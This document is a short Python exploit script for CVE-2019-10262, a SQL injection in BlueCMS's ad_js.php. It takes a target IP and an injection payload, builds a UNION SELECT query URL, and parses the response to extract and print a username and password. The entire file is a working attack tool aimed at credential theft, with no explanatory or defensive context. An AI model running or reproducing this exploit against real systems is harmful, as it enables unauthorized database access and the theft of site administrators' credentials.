# coding:utf-8

import json
import requests
import sys
import re

from optparse import OptionParser

# CVE-2019-10262
# initialization
ret = dict()
ret['status'] = str()
ret['info'] = None


def main():
    usage = "Usage: %prog --ip <ip address> --payload"
    parse = OptionParser(usage=usage)
    parse.add_option("-i", '--ip', type="string", dest="ip", help="specify the IP address")
    parse.add_option("-p", '--payload', type="string", dest="payload", help="sql injection payload")
    options, args = parse.parse_args()

    if not options.ip:
        ret['status'] = 'fail'
        sys.exit()

    if not options.payload:
        ret['status'] = 'fail'
        sys.exit()

    payload = "http://{}/bluecms/ad_js.php?ad_id=1 union select 1,2,3,4,5,6,{}".format(options.ip, options.payload)
    # print('[*] payload: {}'.format(payload))

    try:
        res = requests.get(payload)
        if res.status_code == 200:
            retn = re.findall('(".*?")', res.text)[0].strip("\"")
            if retn:
                ret['status'] = 'success'
                ret['info'] = {'username': retn.split(":")[0],
                               'password': retn.split(":")[1]}
    except Exception as err:
        ret['status'] = 'fail'
        ret['info'] = err
        # print("[-]{}".format(err))

    print(json.dumps(ret))


if __name__ == '__main__':
    main()
